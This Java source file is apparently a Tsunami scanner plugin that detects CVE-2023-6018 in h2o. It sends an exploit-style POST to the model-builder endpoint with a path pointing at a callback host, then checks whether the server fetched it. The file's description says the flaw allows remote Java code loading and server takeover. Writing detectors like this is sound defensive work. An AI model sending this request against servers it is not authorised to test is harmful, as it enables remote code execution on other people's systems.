/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.cve20236018;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpHeaders;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A VulnDetector plugin for CVE 20236018. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "CVE-2023-6018 Detector",
    version = "0.1",
    description =
        "This detector checks for occurrences of CVE-2023-6018 in h2o default installations.",
    author = "Marius Steffens (mariussteffens@google.com)",
    bootstrapModule = Cve20236018DetectorModule.class)
@ForWebService
public final class Cve20236018Detector implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve20236018Detector(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    var payload = getTsunamiCallbackHttpPayload();

    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "Tsunami callback server is not setup for this environment, cannot run CVE-2023-6018"
              + " Detector.");
      return false;
    }

    var requestWithPayload = getExploitRequest(networkService, payload);

    try {
      var response = this.httpClient.send(requestWithPayload, networkService);

      return looksLikeH2oResponse(response) && payload.checkIfExecuted();
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Failed to send request.");
      return false;
    }
  }

  private Payload getTsunamiCallbackHttpPayload() {
    return this.payloadGenerator.generate(
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.SSRF)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.INTERPRETATION_ANY)
            .setExecutionEnvironment(PayloadGeneratorConfig.ExecutionEnvironment.EXEC_ANY)
            .build());
  }

  private HttpRequest getExploitRequest(NetworkService networkService, Payload payload) {
    String rootUrl = NetworkServiceUtils.buildWebApplicationRootUrl(networkService);
    String body = String.format("model_id=irrelevant&path=http://%s", payload.getPayload());
    return HttpRequest.post(rootUrl + "3/ModelBuilders/generic")
        .setHeaders(
            HttpHeaders.builder()
                .addHeader("content-type", "application/x-www-form-urlencoded")
                .build())
        .setRequestBody(ByteString.copyFromUtf8(body))
        .build();
  }

  private boolean looksLikeH2oResponse(HttpResponse response) {
    return response.status().isSuccess()
        && response.bodyString().get().contains("model_id")
        && response.bodyString().get().contains("Import MOJO Model");
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder().setPublisher("GOOGLE").setValue("CVE-2023-6018"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("CVE-2023-6018")
                .setDescription(
                    "An attacker can use the model upload functionality to load remote Java code"
                        + " and gains code execution on the server hosting the h2o application.")
                .setRecommendation(
                    "There is no patch available as this is considered intended functionality."
                        + " Restrict access to h2o to be local only, and do not expose it to the"
                        + " network."))
        .build();
  }
}
